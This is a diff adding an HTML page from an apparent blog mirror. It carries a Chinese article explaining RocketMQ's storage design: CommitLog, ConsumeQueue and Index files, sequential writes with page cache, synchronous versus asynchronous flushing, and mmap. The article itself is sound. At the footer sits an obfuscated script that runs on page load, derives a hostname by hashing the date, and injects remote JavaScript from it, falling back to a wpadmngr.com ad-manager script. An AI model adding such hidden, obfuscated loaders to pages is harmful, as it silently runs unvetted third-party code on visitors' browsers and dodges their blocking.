@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>RocketMQ存储设计到底强在哪？ - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">RocketMQ存储设计到底强在哪？</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    
+                        
+                    
+                    <h2>
+<a id="_0"></a>引言</h2> 
+<p>对于一款消息中间件来说，优良的数据存储设计，是实现高性能消息吞吐以及消息查询的关键所在。因为消息中间件对于外部来说就是发消息消费消息的一个平台基础设施，但是从其本身来说，需要将海量消息数据信息持久化在RocketMQ节点所在的服务器上，这样即便是服务器断电，重启等情况下，也不至于丢失消息数据。另外在进行消息消费的时候，RocketMQ如何能借助自身的存储设计快速检索到对应的消息也是非常重要的，因此本文主要对RocketMQ存储设计进行了设计分析。</p> 
+<h2>
+<a id="_3"></a>存储结构</h2> 
+<p>RocketMQ对应的存储文件主要包括三类，分别是Commitlog文件、ConsumeQueue文件以及Index文件，每一个文件都有其特殊的使命。<br> <img src="https://images2.imgbox.com/a4/50/p8BH8r4G_o.png" alt="在这里插入图片描述"></p> 
+<h3>
+<a id="Commitlog_7"></a>Commitlog文件</h3> 
+<p>当生产者将消息发送到RocketMQ的Broker之后，需要将消息进行持久化存储，防止消息数据丢失。RocketMQ将消息数据写入存储文件CommitLog中，按照消息的发送顺序写入文件当中，每个文件的大小约为1G，当达到文件大小限制后，就会创建新的CommitLog文件。RocketMQ作为消息中间件来说，最主要的数据流程就是基于主题的发布-订阅模式进行消息的发布以及消费，那么当消费者根据自己订阅的Topic进行消息消费的时候，Broker怎么在那么多的CommitLog文件中找到对应Topic的消息数据呢？</p> 
+<p><img src="https://images2.imgbox.com/cc/b3/fy7yqcaX_o.png" alt="在这里插入图片描述"><br> 大家可以想一想，CommitLog文件中的消息数据是一条一条顺序写的，最笨的方法就是遍历文件，作为一款高性能的消息中间件，显然这不是一个好的解决方案。就像从数据库查询数据的时候，遍历的效率肯定是很低的。那么我们可不可以借助数据库提升数据查询的方式，使用索引来加快消息数据的查询呢？答案是肯定的。就像Mysql中的索引本身需要文件保存一样，在RocketMQ中页有单独保存索引的文件，就是ConsumerQueue文件。</p> 
+<h3>
+<a id="ConsumerQueue_13"></a>ConsumerQueue文件</h3> 
+<p>在RocketMQ中，每个Topic对应多个MessageQueue，每个MessageQueue对应一组ConsumerQueue文件索引文件。ConsumerQueue文件中存储了消息相对于CommitLog文件的offset偏移量，CommitLog文件本身实际上也是通过偏移量来进行命名如第一个文件是0000000000000，那么第二文件就是消息总量之和00000001232321，往后新的文件再进行累计。为什么这么做呢？主要就是在进行消息查找的时候根据消息的偏移量通过二分查找快速定位具体的CommitLog文件，提升消息查找效率。需要说明的是，Broker在进行消息写入CommitLog文件中就会异步将其对应的偏移量写入ConsumerQueue文件中。</p> 
+<p><img src="https://images2.imgbox.com/ba/56/duSLyjme_o.png" alt="在这里插入图片描述"><br> 在ConsumerQueue文件中实际存储了CommitLog文件的offset偏移量、消息长度以及tag的hashcode，组成20字节的block块。其在Broker上面的存储路径大致是：…/store/consumequeue/{topic}/{queueid}/{file}。其中topic就是生产中订阅的主题，因此消费者在消费消息的时候，Broker会根据其对应的Topic找到对应的 ConsumerQueue文件，进而找到其索引位置，再到CommitLog文件中直接定位具体的消息。</p> 
+<h3>
+<a id="Index_18"></a>Index文件</h3> 
+<p>另外RocketMQ的特性功能就是可以实现按照消息的属性进行消息搜索，即建立了索引 Key 的 hashcode 与物理偏移量的映射关系，根据 key 先快速定义到 commitlog 文件。</p> 
+<p><img src="https://images2.imgbox.com/d5/df/YecNt9Jh_o.png" alt="在这里插入图片描述"></p> 
+<h2>
+<a id="_23"></a>存储性能设计精髓</h2> 
+<p>上文中为大家阐述了RocketMQ关于存储结构的设计，优秀的存储设计师实现高性能读写的前提。那么除了存储结构的设计，RocketMQ也使用了一些性能优化手段来实现其强大的消息吞吐能力。</p> 
+<h3>
+<a id="_26"></a>消息顺序写</h3> 
+<p>前文中说过，消息进入RocketMQ之后，消息数据是通过顺序写的方式落到CommitLog文件中的。那么这里面就涉及两个问题，为什么进行顺序写以及是不是直接写磁盘文件。</p> 
+<p>1、为什么要顺序写？<br> 当新的数据到来时，只要在之前的文件末尾进行数据追加就可以，这样的数据写入效率要比随机写入的效率高。</p> 
+<p>2、每次数据写入的时候是直接写磁盘文件吗？<br> 我们可以反过想，如果每次都是落盘写入的话实际效率是不高的，无法满足消息中间件这种高吞吐的性能要求，因此RocketMQ实际是借助操作系统的page cache来提升写入效率的，消息并不是直接写入磁盘，认识先写入操作系统的page cache，然后再通过异步刷盘的方式，写入CommitLog文件中，这样借助顺序写以及系统的page cache可以时间近乎内存的数据写入效率。</p> 
+<h3>
+<a id="_34"></a>同步刷盘和异步刷盘</h3> 
+<p>刚才所说的异步写入，其实就是RocketMQ的异步刷盘模式，但是大家想想这个模式有没有什么问题。为了提升数据吞吐量，消息数据过来后，并没有直接写盘，而是在系统中的page cache中。那么此时如果Broker宕机了，那么此时的消息数据是容易丢失的。所以虽然异步刷盘的写入效率高但是也存在数据丢失的风险。</p> 
+<p>同步刷盘<br> 在同步刷盘的场景下，当Broker接受到对应的消息之后，Broker将会把这条消息刷入磁盘的CommitLog中，才会返回确认消息给生产者。如果在进行消息写入的时候Broker挂了，那么生产者会感受到消息投递失败，一般都会都有消息重新发送的重试逻辑。<br> 这样看消息似乎不会丢失了，但是由于每次都是先落盘，就会导致数据写入性能下降。</p> 
+<h3>
+<a id="MMAP_41"></a>MMAP</h3> 
+<p>在RocketMQ中使用了mmap技术来实现Conmmitlog文件的高性能读写，mmap就是一种内存映射文件的方法，对于传统的文件IO交互来说，需要经过多次的数据复制过程才能将用户进程的数据写入硬盘或者读入程序。而mmap可以直接将虚拟内存中的文件与硬盘中文件地址进行映射，减少了数据拷贝的过程，从而提升了数据写入的效率。关于这部分的内容可以参见以前的文章有详细的介绍。<br> <a href="https://blog.csdn.net/Diamond_Tao/article/details/117969644">RocketMQ高性能读写</a></p> 
+<p><img src="https://images2.imgbox.com/d1/bf/xEoes0s1_o.png" alt="在这里插入图片描述"></p> 
+<h2>
+<a id="_47"></a>总结</h2> 
+<p>本文主要堆RocketMQ的存储设计进行了分析，围绕如何实现高性能消息写入和查询展开了阐述，希望在分析这些优秀中间的具体实现过程中，我们可以将这些优秀设计融入到具体的项目实践中，当我们遇到类似的问题的时候可以借助于这些设计思想来解决实际的问题。</p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
